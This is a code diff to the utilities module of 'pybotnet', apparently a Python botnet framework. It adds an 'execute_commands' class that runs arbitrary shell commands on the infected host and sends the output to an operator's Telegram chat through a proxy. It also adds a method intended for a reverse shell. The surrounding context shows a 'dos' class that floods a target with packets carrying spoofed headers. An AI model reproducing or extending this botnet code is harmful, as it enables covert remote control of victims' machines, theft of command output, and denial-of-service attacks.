@@ -1,6 +1,7 @@
 '''Common utilities'''
 
 # pybotnet modules
+import threading
 from . import settings
 
 # import built-in & third-party modules
@@ -13,7 +14,7 @@ import time
 import zipfile
 import os
 import random
-
+import subprocess
 import schedule
 
 from typing import List
@@ -94,6 +95,37 @@ class dos:
                 s.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'),
                          (self.target, self.port))
                 s.close()
+            
+            
+class execute_commands:
+    def __init__(self,command,ADMIN_CHAT_ID,TELEGRAM_TOKEN,logger,timeout=5):
+        self.command = command
+        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
+        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
+        self.logger = logger
+        self.timeout = timeout
+
+    def send_message(self,text: str):
+        send_message_by_third_party_proxy(
+            text, TELEGRAM_TOKEN=self.TELEGRAM_TOKEN,
+            ADMIN_CHAT_ID=self.ADMIN_CHAT_ID, logger=self.logger)
+
+    def clean_shell_data(self,output):
+        output = str(output).replace('\\r\\n', '\n')  # cleaning data
+        output = str(output).replace('\\n', '\n')
+        output = str(output).replace("b'", '')
+        return output
+
+    def runcommand(self):
+        result = subprocess.check_output(self.command, shell=True)
+        self.send_message(f"""RE: {self.command}
+        Results: {self.clean_shell_data(result)}""")
+        return 0
+
+
+    def runcommand_for_reverse_shell(self):
+        result = subprocess.check_output(self.command, shell=True)
+        return result
 
 
 def get_current_epoc_time() -> float:
